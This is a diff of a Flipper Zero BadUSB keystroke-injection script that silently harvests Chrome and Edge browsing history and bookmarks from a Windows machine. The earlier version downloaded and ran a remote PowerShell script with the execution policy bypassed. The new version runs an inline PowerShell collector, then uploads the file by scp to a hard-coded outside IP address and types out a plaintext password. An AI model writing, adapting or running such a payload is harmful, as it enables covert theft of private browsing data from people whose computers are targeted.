@@ -1,8 +1,23 @@
-REM Title: Browser Data Exfiltration via SCP
-REM Description: Extract browser data and send it to a remote server using SCP
+REM Complete Browser data collection and SCP script - fixed string interpolation
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CalebCurranVelasco/Flipper-Zero-BadUSB/refs/heads/main/Payloads/Flip-BrowserData/browserData.ps1 -OutFile $env:TEMP\browserdata.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\browserdata.ps1"
+STRING cmd
 ENTER
-
+DELAY 750
+REM Create PowerShell script with proper string formatting
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'; $outFile = Join-Path $env:TEMP ('BrowserData_' + $timestamp + '.txt'); $logFile = Join-Path $env:TEMP ('BrowserLog_' + $timestamp + '.txt'); function Write-Log { param([string]$msg) Add-Content $logFile -Value (('[{0}] {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $msg)) }; Write-Log 'Starting collection'; function Get-BrowserData { param([string]$b,[string]$t); $regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'; try { if($b -eq 'chrome' -and $t -eq 'history') { $path = Join-Path $env:USERPROFILE 'AppData\Local\Google\Chrome\User Data\Default\History' } elseif($b -eq 'chrome' -and $t -eq 'bookmarks') { $path = Join-Path $env:USERPROFILE 'AppData\Local\Google\Chrome\User Data\Default\Bookmarks' } elseif($b -eq 'edge' -and $t -eq 'history') { $path = Join-Path $env:USERPROFILE 'AppData\Local\Microsoft\Edge\User Data\Default\History' } elseif($b -eq 'edge' -and $t -eq 'bookmarks') { $path = Join-Path $env:USERPROFILE 'AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks' }; Get-Content -Path $path -ErrorAction SilentlyContinue | Select-String -AllMatches $regex | ForEach-Object { ($_.Matches).Value } | Sort-Object -Unique | ForEach-Object { \"[$($b)-$($t)] $_\" } } catch { Write-Log ('Error reading ' + $b + ' ' + $t) } }; Write-Log 'Collecting Chrome data'; Get-BrowserData 'chrome' 'history' >> $outFile; Get-BrowserData 'chrome' 'bookmarks' >> $outFile; Write-Log 'Collecting Edge data'; Get-BrowserData 'edge' 'history' >> $outFile; Get-BrowserData 'edge' 'bookmarks' >> $outFile; Write-Log 'Collection complete'; echo $outFile"
+ENTER
+DELAY 2000
+REM Get only the data file, explicitly excluding log files
+STRING for /F "tokens=*" %i in ('powershell -Command "Get-ChildItem %TEMP%\BrowserData_*.txt | Where-Object { $_.Name -notlike '*Log*' } | Sort-Object LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty FullName"') do @echo Uploading %i && @scp %i Benjak617@174.51.68.96:/
+ENTER
+DELAY 3000
+STRING yes
+ENTER
+DELAY 3000
+STRING Snowman1234!
+ENTER
+DELAY 5000
+STRING exit
+ENTER
